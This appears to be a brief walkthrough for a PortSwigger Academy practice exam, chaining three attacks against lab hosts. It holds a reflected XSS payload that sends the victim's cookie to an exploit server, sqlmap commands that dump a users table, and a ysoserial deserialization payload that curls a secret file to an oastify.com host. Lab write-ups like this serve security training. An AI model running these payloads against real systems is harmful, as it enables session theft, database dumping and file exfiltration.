# Portswigger Academy 
## Practice exam 2
1. Reflected XSS at search function:

    Send this payload to the victim: 
   ```
   <script>
        location='https://<lab_id>.web-security-academy.net%3ffind%3dtest"}%3blocation%3d`https%3a//exploit-<exploit_server_id>.exploit-server.net%3fc%3d${document.cookie}`%3b//'
   </script>
   ```
   Access the log to retrieve the victim's cookie and gain access to the advanced search function

2. SQL Injection at advanced search:
    
    Use `sqlmap` to dump the database:
    ```
        > sqlmap -u "https://0aec00390379f3dd826ef645003f0018.web-security-academy.net/filtered_search?find=&organize=5&order=ASC&BlogArtist=" --cookie="session=..." -p order --random-agent --batch --level 5
        > sqlmap -u "https://0aec00390379f3dd826ef645003f0018.web-security-academy.net/filtered_search?find=&organize=5&order=ASC&BlogArtist=" --cookie="session=..." -p order --random-agent --batch --level 5 --dbms=PostgreSQL --dbs --threads 5
        > sqlmap -u "https://0aec00390379f3dd826ef645003f0018.web-security-academy.net/filtered_search?find=&organize=5&order=ASC&BlogArtist=" --cookie="session=..." -p order --random-agent --batch --level 5 --dbms=PostgreSQL -D public --tables --threads 5
        > sqlmap -u "https://0aec00390379f3dd826ef645003f0018.web-security-academy.net/filtered_search?find=&organize=5&order=ASC&BlogArtist=" --cookie="session=..." -p order --random-agent --batch --level 5 --dbms=PostgreSQL -D public -T users --dump --threads 5
    ```

3. Java deserialization to RCE in `admin_prefs` cookie:

    Use `ysoserial` to generate the payload used to send the request to admin panel:
    ```
        > java -jar ysoserial-all.jar CommonsCollections3 "curl -X POST txu9u0ysvstcub15mgrahxhdv41vplda.oastify.com -d @/home/carlos/secret" | gzip -f | base64 -w0
    ```
